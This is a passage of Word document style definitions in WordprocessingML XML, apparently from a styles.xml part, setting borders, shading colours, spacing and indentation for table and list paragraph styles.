        <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E5272" w:themeFill="accent5"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightList-Accent6">
    <w:name w:val="Light List Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="61"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="007698" w:themeFill="accent6"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightShading-Accent2">
    <w:name w:val="Light Shading Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="60"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="A23919" w:themeColor="accent2" w:themeShade="BF"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D2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2C7" w:themeFill="accent2" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="F6D2C7" w:themeFill="accent2" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightShading-Accent3">
    <w:name w:val="Light Shading Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="60"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="797B87" w:themeColor="accent3" w:themeShade="BF"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B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9EB" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="E9E9EB" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightShading-Accent4">
    <w:name w:val="Light Shading Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="60"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="006D77" w:themeColor="accent4" w:themeShade="BF"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929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8F7FF" w:themeFill="accent4" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A8F7FF" w:themeFill="accent4" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightShading-Accent5">
    <w:name w:val="Light Shading Accent 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="60"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="163D55" w:themeColor="accent5" w:themeShade="BF"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E527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D7EC" w:themeFill="accent5" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="accent5" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightShading-Accent6">
    <w:name w:val="Light Shading Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="60"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="005771" w:themeColor="accent6" w:themeShade="BF"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00769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EAFF" w:themeFill="accent6" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A6EAFF" w:themeFill="accent6" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="character" w:styleId="LineNumber">
    <w:name w:val="line number"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="List">
    <w:name w:val="List"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:ind w:left="283" w:hanging="283"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="List2">
    <w:name w:val="List 2"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:ind w:left="566" w:hanging="283"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="List3">
    <w:name w:val="List 3"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:ind w:left="849" w:hanging="283"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="List4">
    <w:name w:val="List 4"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:ind w:left="1132" w:hanging="283"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="List5">
    <w:name w:val="List 5"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:ind w:left="1415" w:hanging="283"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListBullet4">
    <w:name w:val="List Bullet 4"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="13"/>
      </w:numPr>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListBullet5">
    <w:name w:val="List Bullet 5"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="14"/>
      </w:numPr>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListContinue">
    <w:name w:val="List Continue"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:ind w:left="283"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListContinue2">
    <w:name w:val="List Continue 2"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:ind w:left="566"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListContinue3">
    <w:name w:val="List Continue 3"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:ind w:left="849"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListContinue4">
    <w:name w:val="List Continue 4"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:ind w:left="1132"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListContinue5">
    <w:name w:val="List Continue 5"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:ind w:left="1415"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListNumber3">
    <w:name w:val="List Number 3"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="15"/>
      </w:numPr>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListNumber4">
    <w:name w:val="List Number 4"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="16"/>
      </w:numPr>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListNumber5">
    <w:name w:val="List Number 5"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="17"/>
      </w:numPr>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="MacroText">
    <w:name w:val="macro"/>
    <w:link w:val="MacroTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="480"/>
        <w:tab w:val="left" w:pos="960"/>
        <w:tab w:val="left" w:pos="1440"/>
        <w:tab w:val="left" w:pos="1920"/>
        <w:tab w:val="left" w:pos="2400"/>
        <w:tab w:val="left" w:pos="2880"/>
        <w:tab w:val="left" w:pos="3360"/>
        <w:tab w:val="left" w:pos="3840"/>
        <w:tab w:val="left" w:pos="4320"/>
      </w:tabs>
      <w:spacing w:after="0" w:line="270" w:lineRule="atLeast"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="MacroTextChar">
    <w:name w:val="Macro Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="MacroText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid1">
    <w:name w:val="Medium Grid 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="67"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="text1" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6EB0D9" w:themeFill="text1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6EB0D9" w:themeFill="text1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid1-Accent1">
    <w:name w:val="Medium Grid 1 Accent 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="67"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
